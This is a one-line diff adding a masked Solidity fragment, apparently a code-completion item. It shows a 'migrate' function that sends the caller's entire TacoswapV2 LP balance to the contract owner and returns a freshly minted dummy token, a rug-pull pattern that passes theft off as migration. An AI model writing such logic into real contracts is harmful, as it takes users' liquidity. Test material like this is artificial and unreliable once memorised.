@@ -1,0 +1,1 @@
+"function migrate(ITacoswapV2Pair orig) public returns (IERC20) {        DummyToken dummyToken = new DummyToken();        uint256 lp = orig.balanceOf(msg.sender);        if (lp == 0) return dummyToken;        orig.transferFrom(msg.sender, owner(), lp);        dummyToken.<mask0>;        return dummyToken;    }"
